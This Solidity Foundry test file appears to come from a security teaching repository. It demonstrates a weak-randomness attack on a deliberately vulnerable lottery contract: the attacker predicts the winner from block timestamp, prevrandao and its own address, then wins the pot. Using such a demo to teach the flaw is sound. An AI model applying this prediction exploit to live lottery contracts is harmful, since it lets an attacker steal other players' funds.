// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/v8/VulnerableLottery.sol";

contract WeakRandomness is Test {
    VulnerableLottery lottery;
    address victim;
    address attacker;

    function setUp() public {
        lottery = new VulnerableLottery();

        victim = makeAddr("victim");
        attacker = makeAddr("attacker");

        vm.deal(victim, 10 ether);
        vm.deal(attacker, 10 ether);

        // Players joins lottery
        vm.prank(victim);
        lottery.join{ value: 1 ether }();
        vm.prank(attacker);
        lottery.join{ value: 1 ether }();
    }

    function testWeakRandomnessAttack() public {
        console.log("=== WEAK RANDOMNESS ATTACK DEMO ===\n");
        address[] memory players = lottery.getPlayers();

        assertEq(players[0], victim);
        assertEq(players[1], attacker);

        // --- Attacker predicts randomness before calling pickWinner() ---

        // Simulate randomness off-chain (same block)
        uint256 predicted = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp, // predictable
                    block.prevrandao, // predictable
                    attacker // attacker plans to call pickWinner()
                )
            )
        ) % players.length;

        // Check that attacker WILL win (index 1)
        assertEq(predicted, 1);

        console.log("Old attacker balance:", attacker.balance / 1e18, "ETH");

        // --- Attacker executes the real transaction ---
        vm.prank(attacker);
        address actualWinner = lottery.pickWinner();

        // Confirm attacker won for real
        assertEq(actualWinner, attacker);
        assertEq(attacker.balance, 11 ether); // attacker wins 2 ETH pot

        console.log("Attacker won the lottery");
        console.log("New attacker balance:", attacker.balance / 1e18, "ETH");
    }
}
